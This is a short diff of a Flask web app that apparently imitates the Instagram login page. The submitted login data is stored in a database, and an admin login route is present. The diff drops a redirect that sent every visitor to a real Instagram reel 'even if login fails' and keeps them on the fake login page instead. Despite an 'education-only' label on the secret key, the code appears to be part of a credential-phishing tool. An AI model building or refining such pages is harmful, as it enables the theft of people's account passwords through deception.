@@ -10,9 +10,6 @@ app.secret_key = 'dev-key-for-education-only-12345'
 # Database setup
 DATABASE = 'database.db'
 
-# The URL to redirect to after successful login
-REDIRECT_URL = 'https://www.instagram.com/reel/DcJxIW3Rt0R/?utm_source=ig_web_copy_link&igsi=NTc4MTIwNjQ2YQ=='
-
 def get_db():
     db = getattr(g, '_database', None)
     if db is None:
@@ -173,8 +170,8 @@ def login():
     ))
     db.commit()
     
-    # ALWAYS redirect to Instagram reel (even if login fails)
-    return redirect(REDIRECT_URL)
+    # Stay on the Instagram login page
+    return redirect(url_for('home'))
 
 # Admin Login Page
 @app.route('/admin/login', methods=['GET', 'POST'])
